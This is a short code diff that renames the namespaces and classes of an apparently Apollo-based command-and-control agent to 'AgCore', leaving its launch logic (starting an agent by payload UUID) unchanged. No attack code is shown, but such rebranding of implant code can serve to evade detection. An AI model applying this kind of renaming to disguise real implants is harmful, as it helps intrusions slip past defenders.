@@ -1,23 +1,23 @@
 ﻿using System;
-using ApolloInterop.Serializers;
+using AgInterop.Serializers;
 using System.Collections.Generic;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
+using AgInterop.Classes;
+using AgInterop.Interfaces;
 using System.IO.Pipes;
-using ApolloInterop.Structs.ApolloStructs;
+using AgInterop.Structs.AgCoreStructs;
 using System.Text;
 using System.Threading;
 using System.Linq;
 using System.Collections.Concurrent;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Enums.ApolloEnums;
+using AgInterop.Classes.Core;
+using AgInterop.Classes.Events;
+using AgInterop.Enums.AgCoreEnums;
 using System.Runtime.InteropServices;
-using ApolloInterop.Utils;
+using AgInterop.Utils;
 using System.Security.Cryptography;
 using Microsoft.Win32;
 
-namespace Apollo
+namespace AgCore
 {
     class Program
     {
@@ -65,7 +65,7 @@ namespace Apollo
                 return;
             }
             
-            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
+            Agent.AgCore ap = new Agent.AgCore(Config.PayloadUUID);
             ap.Start();
         }
         
